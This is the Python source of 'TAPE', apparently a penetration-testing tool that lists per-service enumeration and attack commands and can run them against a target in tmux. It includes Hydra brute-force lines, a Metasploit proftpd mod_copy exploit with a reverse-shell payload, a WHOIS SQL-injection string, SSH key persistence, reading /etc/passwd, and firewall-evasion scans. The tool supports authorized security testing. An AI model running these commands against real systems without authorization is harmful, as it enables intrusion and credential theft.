#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TAPE - Tmux Automated Pentesting Enumeration
Chronos Security
https://chronos-security.ro
https://github.com/Chronos-Security
"""

import os
import sys
import shutil
import requests
import argparse
import subprocess
from collections import defaultdict
from datetime import datetime

# -----------------------------
# Configurations and Variables
# -----------------------------

# Colors for output
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
MAGENTA = '\033[0;35m'
CYAN = '\033[0;36m'
BRIGHT_YELLOW = '\033[1;33m'
NC = '\033[0m'  # No Color

# Additional Colors for Protocol, Actions, and Subactions
PROTOCOL_COLOR = '\033[1;31m'  # Bright Red
ACTION_COLOR = '\033[1;34m'    # Bright Blue
SUBACTION_COLOR = ACTION_COLOR  # Same color for action and subaction

# Directories
RECON_DIR = "recon"
VULNS_DIR = "vulns"
FILES_DIR = "files"
NOTES_DIR = "notes"

# Create necessary directories and files with proper permissions
directories = [VULNS_DIR, RECON_DIR, FILES_DIR, NOTES_DIR]
files = ["notes.txt", "users.txt", "passwords.txt", "hashes.txt", "creds.txt"]

def create_directories_and_files():
    # Get the original user's UID and GID
    original_uid = int(os.environ.get('SUDO_UID', os.getuid()))
    original_gid = int(os.environ.get('SUDO_GID', os.getgid()))

    for directory in directories:
        os.makedirs(directory, exist_ok=True)
        os.chown(directory, original_uid, original_gid)

    for filename in files:
        filepath = os.path.join(NOTES_DIR, filename)
        with open(filepath, 'a'):
            pass
        os.chown(filepath, original_uid, original_gid)

# Commands for each service and action
# Updated to support grouped commands
COMMANDS = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))

# Services and their default ports
SERVICES = {
    "FTP": {"ports": [21], "transport": "TCP"},
    "SSH": {"ports": [22], "transport": "TCP"},
    "TELNET": {"ports": [23], "transport": "TCP"},
    "SMTP": {"ports": [25, 465, 587], "transport": "TCP"},
    "DNS": {"ports": [53], "transport": "TCP/UDP"},
    "TFTP": {"ports": [69], "transport": "UDP"},
    "HTTP": {"ports": [80, 443, 8080, 8000, 8008], "transport": "TCP"},
    "KERBEROS": {"ports": [88], "transport": "TCP/UDP"},
    "POP3": {"ports": [110, 995], "transport": "TCP"},
    "IMAP": {"ports": [143, 993], "transport": "TCP"},
    "LDAP": {"ports": [389, 636, 3268, 3269], "transport": "TCP"},
    "SMB": {"ports": [139, 445], "transport": "TCP"},
    "RDP": {"ports": [3389], "transport": "TCP"},
    "MYSQL": {"ports": [3306], "transport": "TCP"},
    "NFS": {"ports": [2049], "transport": "TCP/UDP"},
    "RPCBIND": {"ports": [111], "transport": "TCP/UDP"},
    "VNC": {"ports": [5900], "transport": "TCP"},
    "POSTGRES": {"ports": [5432], "transport": "TCP"},
    "REDIS": {"ports": [6379], "transport": "TCP"},
    "MONGODB": {"ports": [27017], "transport": "TCP"},
    "WINRM": {"ports": [5985, 5986], "transport": "TCP"},
    # More will be added in the future
    # CSCTF{I_bet_y0u_d1dn_t_know_A11_t0Ols}
}

# -----------------------------
# Function Definitions
# -----------------------------

def update_script():
    """Updates the script by downloading the latest version from GitHub."""
    print(f"{BLUE}[+] Checking for updates...{NC}")
    github_url = "https://raw.githubusercontent.com/ChronosPK/TAPE/main/tape.py"
    try:
        response = requests.get(github_url, timeout=10)
        if response.status_code == 200:
            script_path = os.path.realpath(__file__)
            backup_path = script_path + ".bak"
            # Backup current script
            shutil.copy2(script_path, backup_path)
            # Write new script
            with open(script_path, 'w', encoding='utf-8') as script_file:
                script_file.write(response.text)
            print(f"{GREEN}[+] TAPE has been updated to the latest version.{NC}")
            print(f"{YELLOW}[i] A backup of the previous version is saved as {backup_path}.{NC}")
        else:
            print(f"{RED}[!] Failed to download the latest version. HTTP Status Code: {response.status_code}{NC}")
    except Exception as e:
        print(f"{RED}[!] An error occurred while updating: {e}{NC}")

# Argument Parser
parser = argparse.ArgumentParser(
    description="TAPE - Tmux Automated Pentesting Enumeration",
    formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=35)
)
parser.add_argument('-n', '--net', help='Set target network (e.g., 192.168.1.0/24)')
parser.add_argument('-i', '--ip', help='Set target IP address')
parser.add_argument('-d', '--domain', metavar='DOMAIN', help='Set target domain')
parser.add_argument('-x', '--execute', action='store_true', help='Execute the enumeration process')
parser.add_argument('-l', '--list-commands', action='store_true', help='List all available commands')
parser.add_argument('-s', '--service', help='Specify a service to list commands for')
parser.add_argument('-q', '--quiet', action='store_true', help='Suppress command output (commands are echoed by default)')
parser.add_argument('-f', '--force-recon', action='store_true', help='Force reconnaissance scans even if already done')
parser.add_argument('-u', '--update', action='store_true', help='Update TAPE to the latest version')
args = parser.parse_args()

def display_help():
    parser.print_help()

def is_root():
    return os.geteuid() == 0

def resolve_domain(domain):
    try:
        result = subprocess.check_output(['dig', '+short', domain], text=True)
        ip = result.strip().split('\n')[0]
        if ip:
            return ip
        else:
            return None
    except subprocess.CalledProcessError:
        return None

def format_command(command, variables):
    # Replace placeholders without braces
    for key, value in variables.items():
        command = command.replace(key, value)
    return command

def list_commands(commands, variables, service=None):
    services_to_list = [service.upper()] if service else sorted(commands.keys(), key=lambda x: SERVICES.get(x, {}).get('ports', [0])[0])
    for protocol in services_to_list:
        if protocol not in commands:
            continue
        actions = commands[protocol]
        ports = ','.join(map(str, SERVICES.get(protocol, {}).get('ports', ['N/A'])))
        transport = SERVICES.get(protocol, {}).get('transport', 'N/A')
        for action in actions:
            for subaction in actions[action]:
                action_subaction_title = f"{PROTOCOL_COLOR}{protocol} - {ports}/{transport} - {ACTION_COLOR}{action} - {SUBACTION_COLOR}{subaction}{NC}"
                print(action_subaction_title)
                for cmd_group in actions[action][subaction]:
                    description = cmd_group.get('description', None)
                    cmds = cmd_group.get('commands', [])
                    if description:
                        print(f"{YELLOW}# {description}{NC}")
                    for cmd in cmds:
                        cmd_display = format_command(cmd, variables)
                        print(cmd_display)
                    print()


def main():
    if len(sys.argv) == 1:
        display_help()
        sys.exit(1)

    variables = {
        'IP': args.ip if args.ip else 'IP',
        'NET': args.net if args.net else 'NET',
        'DOMAIN': args.domain if args.domain else 'DOMAIN',
        'RECON_DIR': RECON_DIR,
        'USER': 'USER',
        'PASS': 'PASS',
    }

    # If both IP and domain are provided
    if args.ip and args.domain:
        resolved_ip = resolve_domain(args.domain)
        if resolved_ip:
            if resolved_ip != args.ip:
                print(f"{RED}[!] Error: Domain {args.domain} does not resolve to IP {args.ip}.{NC}")
                sys.exit(1)
            else:
                variables['IP'] = args.ip
                variables['DOMAIN'] = args.domain
        else:
            print(f"{RED}[!] Error: Unable to resolve domain {args.domain}.{NC}")
            sys.exit(1)
    elif args.domain:
        # Only domain is provided
        resolved_ip = resolve_domain(args.domain)
        if resolved_ip:
            variables['IP'] = resolved_ip
            variables['DOMAIN'] = args.domain
        else:
            print(f"{RED}[!] Error: Unable to resolve domain {args.domain}.{NC}")
            sys.exit(1)
    elif args.ip:
        # Only IP is provided
        variables['IP'] = args.ip
        variables['DOMAIN'] = 'DOMAIN'
    else:
        # Neither IP nor domain is provided
        variables['IP'] = 'IP'
        variables['DOMAIN'] = 'DOMAIN'

    if args.update:
        update_script()
        sys.exit(0)

    # Prioritize domain over IP in URL
    variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"

    # Create directories and files with proper permissions
    create_directories_and_files()

    # Create commands for recon and for each service
    COMMANDS['RECON']['Network'][''] = [
        {
            'description': "netdiscover",
            'commands': [
                "sudo netdiscover -i eth0 -r NET"
            ]
        },
        {
            'description': "nmap",
            'commands': [
                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
                """cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
            ]
        },
        {
            'description': "fping + nmap",
            'commands': [
                "fping -a -g NET 2>/dev/null > recon/hosts",
                "nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"
            ]
        },
        {
            'description': "masscan",
            'commands': [
                "masscan NET –echo > recon/masscan.conf"
            ]
        },
        {
            'description': "UDP with nmap",
            'commands': [
                "nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net",
                "udp-proto-scanner.pl NET"
            ]
        },
        {
            'description': "No man's land",
            'commands': [
                "for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['RECON']['Single Host']['nmap'] = [
        {
            "description": "Extract ports and run all-TCP scan",
            "commands": [
                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
                """cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
            ]
        },
        {
            "description": "Perform OS detection with Nmap",
            "commands": [
                "sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"
            ]
        },
        {
            "description": "Vulnerability scan with Nmap",
            "commands": [
                "nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"
            ]
        },
        {
            "description": "Run UDP scan with Nmap",
            "commands": [
                "nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"
            ]
        },
        {
            'description': "Firewall evasion",
            'commands': [
                'sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP'
        ]
        }
    ]
    COMMANDS['RECON']['Single Host']['rustscan'] = [
        {
            "description": "Fast rustscan analysis",
            "commands": [
                "rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['autorecon'] = [
        {
            "description": "Enumeration with autorecon",
            "commands": [
                "autorecon -v --heartbeat 10 IP"
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['legion'] = [
        {
            "description": "Recon with legion - GUI application",
            "commands": [
                "sudo legion"
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['zenmap'] = [
        {
            "description": "Recon with zenmap - GUI application",
            "commands": [
                "zenmap"
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['No man\'s land'] = [
        {
            "description": "Utilizing /dev/tcp/ip/port to test connection",
            "commands": [
                "for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e \"$port open\\n\"; done"
            ]
        },
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['FTP']['Enumeration']['Anonymous Access'] = [
        {
            'description': "Check for anonymous FTP login with Nmap",
            'commands': [
                'nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt'
            ]
        },
        {
            'description': "Check for anonymous FTP login with FTP client",
            'commands': [
                'ftp -nv IP PORT'
            ]
        }
    ]
    COMMANDS['FTP']['Enumeration']['Banner Grabbing'] = [
        {
            'description': "FTP Banner Grabbing with Nmap",
            'commands': [
                'nmap -sV -p PORT IP -oN recon/ftp_banner.txt'
            ]
        },
        {
            'description': "FTP Banner Grabbing with Netcat",
            'commands': [
                'nc -nv IP PORT'
            ]
        }
    ]
    COMMANDS['FTP']['Enumeration']['Brute Force'] = [
        {
            'description': "FTP Brute Force with Hydra",
            'commands': [
                'hydra -L users.txt -P passwords.txt ftp://IP -s PORT'
            ]
        },
        {
            'description': "FTP User Enumeration with ftp-user-enum",
            'commands': [
                'ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP'
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Read Permissions'] = [
        {
            'description': "List files and directories",
            'commands': [
                'ls -lsa'
            ]
        },
        {
            'description': "Download a specific file",
            'commands': [
                'get FILENAME'
            ]
        },
        {
            'description': "Download all files",
            'commands': [
                'prompt; mget *'
            ]
        },
        {
            'description': "Recursive download using wget",
            'commands': [
                'wget -r ftp://USER:PASS@IP/'
            ]
        },
        {
            'description': "Enter passive FTP session",
            'commands': [
                'quote PASV'
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Write Permissions'] = [
        {
            'description': "Upload binary files",
            'commands': [
                'binary; put BINARY_FILE'
            ]
        },
        {
            'description': "Upload ASCII files",
            'commands': [
                'ascii; put ASCII_FILE'
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Mount Folders'] = [
        {
            'description': "Mount FTP folder using curlftpfs",
            'commands': [
                'mkdir /mnt/ftp',
                'curlftpfs IP /mnt/ftp/ -o user=USER:PASS'
            ]
        },
        {
            'description': "Unmount FTP folder",
            'commands': [
                'fusermount -u /mnt/ftp'
            ]
        }
    ]
    COMMANDS['FTP']['Access']['mod_copy RCE in vsftpd 1.3.5 '] = [
        {
            'description': "Exploit manually",
            'commands': [
                'nc -v IP 21',
                'site cpfr LOCAL_FILE',
                'site cpto FTP_DIRECTORY'
            ]
        },
        {
            'description': "Exploit with metasploit",
            'commands': [
                'sudo msfdb start',
                'msfconsole -q ',
                'use /exploit/unix/ftp/proftpd_modcopy_exec',
                'set Rhosts IP',
                'set lhost tun0',
                'set sitepath /var/www/something',
                'set payload cmd/unix/reverse_python'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SSH']['Enumeration']['Banner Grabbing'] = [
        {
            'description': "SSH Banner Grabbing with Nmap",
            'commands': [
                'nmap -p22 IP -sV'
            ]
        },
        {
            'description': "SSH Keyscan",
            'commands': [
                'ssh-keyscan -t rsa IP -p 22'
            ]
        }
    ]
    COMMANDS['SSH']['Enumeration']['Algorithm Enumeration'] = [
        {
            'description': "List supported algorithms",
            'commands': [
                'nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg'
            ]
        }
    ]
    COMMANDS['SSH']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force SSH with Hydra",
            'commands': [
                'hydra -l USER -P notes/passwords.txt ssh://IP -s 22'
            ]
        }
    ]
    COMMANDS['SSH']['Access'][''] = [
        {
            'description': "Execute a command right after login",
            'commands': [
                'ssh -v USER@IP id;cat /etc/passwd'
            ]
        }
    ]
    COMMANDS['SSH']['Access']['ID_RSA key'] = [
        {
            'description': "Simple login",
            'commands': [
                'chmod 600 id_rsa',
                'ssh -i id_rsa USER@IP'
            ]
        },
        {
            'description': "Passphrase protected",
            'commands': [
                'ssh2john id_rsa > notes/hashes-ssh.txt',
                'john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt'
            ]
        }
    ]
    COMMANDS['SSH']['Access']['Tunnel'] = [
        {
            'description': "Local Tunnel",
            'commands': [
                'ssh -L local_ip:local_port:destination_ip:destination_port user@IP'
            ]
        },
        {
            'description': "Remote Tunnel",
            'commands': [
                'ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP'
            ]
        },
        {
            'description': "Additional arguments",
            'commands': [
                '-N don\'t execute commands',
                '-f run in background'
            ]
        }
    ]
    COMMANDS['SSH']['Access']['Persistence'] = [
        {
            'description': "Generate SSH keys",
            'commands': [
                'ssh-keygen',
                'scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys'
            ]
        }
    ]
    COMMANDS['SSH']['Other']['Port Knock'] = [
        {
            'description': "Check config file",
            'commands': [
                'sudo nano /etc/knockd.conf',
                'sudo vim /etc/default/knockd'
            ]
        },
        {
            'description': "Knock on the found ports to open SSH",
            'commands': [
                'knock -v IP port1 port2 port3'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['TELNET']['Enumeration']['nmap'] = [
        {
            'description': "",
            'commands': [
                'nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet'
            ]
        }
    ]
    COMMANDS['TELNET']['Bruteforce']['hydra'] = [
        {
            'description': "",
            'commands': [
                'hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SMTP']['Enumeration']['VRFY Command'] = [
        {
            'description': "Check for valid users with VRFY",
            'commands': [
                'nc IP 25',
                'VRFY root',
                'VRFY user'
            ]
        },
        {
            'description': "Possible responses",
            'commands': [
                '252 2.0.0 root',
                '550 5.1.1 user: ... User unknown in local recipient table'
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Users Enumeration'] = [
        {
            'description': "With smtp-user-enum",
            'commands': [
                'smtp-user-enum -M VRFY -U users.txt -t IP'
            ]
        },
        {
            'description': "With nmap",
            'commands': [
                'nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users'
            ]
        },
        {
            'description': "With metasploit",
            'commands': [
                'msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum"'
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Allowed Commands'] = [
        {
            'description': "Use nmap to find allowed commands",
            'commands': [
                'nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm'
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Check NTLM Authentication'] = [
        {
            'description': "Use nmap",
            'commands': [
                'nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm'
            ]
        },
        {
            'description': "Check for NTLM challenge response for information disclosure",
            'commands': [
                'telnet DOMAIN PORT',
                'HELO ',
                'NTLM AUTH',
                'TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Find MX servers'] = [
        {
            'description': "Enumerate with dig",
            'commands': [
                'dig +short mx DOMAIN'
            ]
        }
    ]
    COMMANDS['SMTP']['Access']['Enumeration'] = [
        {
            'description': "Things to try while on the server",
            'commands': [
                '- look for info about the network topology',
                '- view headers for relevant information'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['WHOIS']['Enumeration']['Find the domain'] = [
        {
            'description': "Enumeration",
            'commands': [
                'whois -h IP -p PORT "DOMAIN"',
                'echo "DOMAIN" | nc -vn IP PORT'
            ]
        }
    ]
    COMMANDS['WHOIS']['Exploitation']['SQL injection'] = [
        {
            'description': "Payload",
            'commands': [
                'whois -h IP -p PORT "a\') or 1=1#"'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['DNS']['Enumeration']['Automated'] = [
        {
            'description': "Automated enumeration",
            'commands': [
                'nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" IP -oN recon/nmap.dns',
                'dnscan.py -d DOMAIN -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
            ]
        }
    ]
    COMMANDS['WHOIS']['Enumeration']['View Records'] = [
        {
            'description': "All records",
            'commands': [
                'dig DOMAIN ALL'
            ]
        },
        {
            'description': "A records",
            'commands': [
                'dig DOMAIN +short'
            ]
        },
        {
            'description': "Mail server",
            'commands': [
                'dig DOMAIN -t mx +short'
            ]
        },
        {
            'description': "NS, CNAME records",
            'commands': [
                'dig DOMAIN -t ns +short'
            ]
        },
        {
            'description': "ZONE transfer",
            'commands': [
                'dig axfr DOMAIN ns08.DOMAIN',
                'dig axfr IP DOMAIN',
                'dig @IP DOMAIN -t AXFR +nocookie',
                'host -t axfr DOMAIN IP',
                'dnsrecon -d DOMAIN -t axfr'
            ]
        },
        {
            'description': "Specify a DNS server",
            'commands': [
                'dig @IP DOMAIN'
            ]
        }
    ]
    COMMANDS['DNS']['Bruteforce']['Subdomains'] = [
        {
            'description': "Bruteforce subdomains",
            'commands': [
                'wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "DOMAIN" -H "Host: FUZZ.DOMAIN" --hl 7 -f recon/subdomains.txt',
                'gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u DOMAIN',
                'nmap -T4 -p PORT --script dns-brute DOMAIN',
                'dnsrecon -d DOMAIN -D /usr/share/wordlists/dnsmap.txt -t std --xml recon/dnsrecon.xml',
                'puredns bruteforce all.txt $domain'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['TFTP']['Enumeration']['Nmap'] = [
        {
            'description': "Enumerate with nmap",
            'commands': [
                'nmap -n -Pn -sUV -pPORT --script tftp-enum IP -oN recon/nmap.tftp'
            ]
        }
    ]
    COMMANDS['TFTP']['Enumeration']['Metasploit'] = [
        {
            'description': "See upload/download capabilities",
            'commands': [
                'msfconsole -q -e "use auxiliary/admin/tftp/tftp_transfer_util"'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SMB']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Run SMB NSE Scripts",
            'commands': [
                'nmap --script "safe or smb-enum-*" -p 139,445 IP -oN recon/nmap.smb'
            ]
        }
    ]
    COMMANDS['SMB']['Enumeration']['Enum4Linux'] = [
        {
            'description': "Enumerate SMB with Enum4Linux",
            'commands': [
                'enum4linux -avA IP > recon/enum4linux.out'
            ]
        }
    ]
    COMMANDS['SMB']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force SMB with Hydra",
            'commands': [
                'hydra -L users.txt -P passwords.txt IP smb'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['NFS']['Enumeration']['Showmount'] = [
        {
            'description': "List NFS shares",
            'commands': [
                'showmount -e IP'
            ]
        }
    ]
    COMMANDS['NFS']['Access']['Mount Share'] = [
        {
            'description': "Mount NFS share",
            'commands': [
                'mkdir /mnt/nfs',
                'mount -t nfs IP:/share /mnt/nfs'
            ]
        }
    ]
    COMMANDS['NFS']['Access']['Unmount Share'] = [
        {
            'description': "Unmount NFS share",
            'commands': [
                'umount /mnt/nfs'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['LDAP']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Enumerate LDAP with Nmap",
            'commands': [
                'nmap -n -sV --script "ldap* and not brute" IP -oN recon/nmap.ldap'
            ]
        }
    ]
    COMMANDS['LDAP']['Enumeration']['ldapsearch'] = [
        {
            'description': "Anonymous LDAP search",
            'commands': [
                'ldapsearch -x -H ldap://IP -b "DC=DOMAIN,DC=COM"'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['RDP']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Check RDP security",
            'commands': [
                'nmap -sV -Pn -p 3389 --script rdpscreenshot.nse IP -oN recon/nmap.rdp'
            ]
        }
    ]
    COMMANDS['RDP']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force RDP with Hydra",
            'commands': [
                'hydra -L users.txt -P passwords.txt rdp://IP'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['MYSQL']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "MySQL Enumeration with Nmap",
            'commands': [
                'nmap -sV -Pn -T4 -vv --script=mysql* IP -p 3306 -oN recon/nmap.mysql'
            ]
        }
    ]
    COMMANDS['MYSQL']['Access']['Login'] = [
        {
            'description': "Login to MySQL",
            'commands': [
                'mysql -u root -p -h IP'
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------


    # List Commands
    if args.list_commands:
        variables['PORT'] = 'PORT'
        list_commands(COMMANDS, variables, args.service)
        sys.exit(0)

    if not args.execute:
        variables['PORT'] = 'PORT'
        list_commands(COMMANDS, variables, args.service)
        sys.exit(0)

    if not is_root():
        print(f"{RED}[!] Please run as root.{NC}")
        sys.exit(1)

    # Proceed with execution
    # Check if recon has been done
    recon_done = os.path.exists('recon/nmap.init')
    if recon_done and not args.force_recon:
        print(f"{GREEN}[*] Reconnaissance scans already completed.")
        print(f"{YELLOW}[*] Use --force-recon to run reconnaissance scans again.{NC}")
    else:
        print(f"{GREEN}[*] Running reconnaissance scans...{NC}")
        variables['PORT'] = ''
        # Execute the first RECON command group
        recon_commands = COMMANDS['RECON']['Single Host']['nmap'][0]['commands']
        desc = COMMANDS['RECON']['Single Host']['nmap'][0]['description']
        if not args.quiet:
            print(f"{PROTOCOL_COLOR}RECON{NC} - {ACTION_COLOR}{desc}{NC}")
        for cmd in recon_commands:
            cmd_exec = format_command(cmd, variables)
            if not args.quiet:
                cmd_display = cmd_exec
                print(f"{BRIGHT_YELLOW}$ {cmd_display}{NC}")
            subprocess.call(cmd_exec, shell=True)

    # Continue with parsing open ports
    if os.path.exists('recon/nmap.init'):
        print(f"{GREEN}[*] Extracting open ports...{NC}")
        open_ports = []
        with open('recon/nmap.init', 'r') as f:
            for line in f:
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    open_ports.append(port)
        if not open_ports:
            print(f"{RED}[!] No open ports found on {variables['IP']}.{NC}")
            sys.exit(1)
        variables['OPEN_PORTS'] = ','.join(open_ports)
        print(f"{GREEN}[*] Open ports: {YELLOW}{variables['OPEN_PORTS']}{NC}")
    else:
        print(f"{RED}[!] Reconnaissance scans did not produce expected output.{NC}")
        sys.exit(1)

    # Parse services from detailed Nmap output
    print(f"{GREEN}[*] Parsing services from Nmap output...{NC}")
    discovered_services = defaultdict(list)
    if os.path.exists('recon/nmap.alltcp'):
        with open('recon/nmap.alltcp', 'r') as f:
            for line in f:
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    port = parts[0].split('/')[0]
                    if len(parts) >= 3:
                        service = parts[2].upper()
                    else:
                        service = 'UNKNOWN'
                    discovered_services[service].append(port)
    else:
        print(f"{RED}[!] Detailed Nmap scan output not found.{NC}")
        sys.exit(1)
    if not discovered_services:
        print(f"{RED}[!] No services found.{NC}")
        sys.exit(1)

    # Filter commands based on discovered services
    commands_to_execute = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
    for service in discovered_services:
        if service in COMMANDS:
            for action in COMMANDS[service]:
                for subaction in COMMANDS[service][action]:
                    for cmd_group in COMMANDS[service][action][subaction]:
                        commands_to_execute[service][action][subaction].append(cmd_group)
        else:
            print(f"{YELLOW}[!] No commands found for service: {service}{NC}")

    # Update variables with URL
    variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"

    # Show commands unless quiet
    if not args.quiet:
        list_commands(commands_to_execute, variables)

    # Execute commands if -x is specified
    if args.execute:
        print(f"{GREEN}[*] Executing service enumeration commands in tmux...{NC}")
        execute_commands_with_tmux(commands_to_execute, variables, discovered_services)

def execute_commands_with_tmux(commands, variables, discovered_services):
    # Check if tmux is installed
    if subprocess.call(['which', 'tmux'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print(f"{RED}[!] tmux is not installed. Please install tmux.{NC}")
        sys.exit(1)

    session_name = f"TAPE_{int(datetime.now().timestamp())}"
    # Start tmux session
    subprocess.call(['tmux', 'new-session', '-d', '-s', session_name])

    window_index = 1
    for protocol in commands:
        if protocol not in discovered_services and protocol != 'RECON':
            continue  # Skip if protocol not in discovered services, except for RECON

        variables['PORT'] = ','.join(discovered_services.get(protocol, []))
        if protocol in SERVICES:
            ports = ','.join(discovered_services.get(protocol, SERVICES[protocol]['ports']))
            transport = SERVICES[protocol]['transport']
        else:
            ports = 'N/A'
            transport = 'N/A'
        for action in commands[protocol]:
            for subaction in commands[protocol][action]:
                # Create window name
                window_name = f"{protocol}_{action}_{subaction}"
                # Replace spaces with underscores and limit length
                window_name = window_name.replace(' ', '_')[:50]
                # Create a new window for each protocol-action-subaction
                subprocess.call(['tmux', 'new-window', '-t', session_name, '-n', window_name])
                protocol_title = f"{protocol} - {ports}/{transport}"
                tmux_cmd = f"echo -e '{PROTOCOL_COLOR}{protocol_title}{NC}'"
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                action_subaction_title = f"{protocol} - {ports}/{transport} - {action} - {subaction}"
                tmux_cmd = f"echo -e '{ACTION_COLOR}{action_subaction_title}{NC}'"
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                for cmd_group in commands[protocol][action][subaction]:
                    description = cmd_group['description']
                    cmds = cmd_group['commands']
                    if description:
                        tmux_cmd = f"echo -e '{YELLOW}# {description}{NC}'"
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                    for cmd in cmds:
                        # Replace variables
                        cmd_exec = format_command(cmd, variables)
                        # Display the command
                        cmd_display = cmd_exec
                        tmux_cmd = f"echo -e '{CYAN}$ {cmd_display}{NC}'"
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                        # Execute the command
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", cmd_exec, 'C-m'])
                # Keep the window open
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", 'bash', 'C-m'])
                window_index += 1

    print(f"{GREEN}[*] Commands sent to tmux session.{NC}")
    print(f"{BLUE}[+] Attaching to tmux session: {session_name}{NC}")
    subprocess.call(['tmux', 'attach-session', '-t', session_name])

if __name__ == '__main__':
    main()
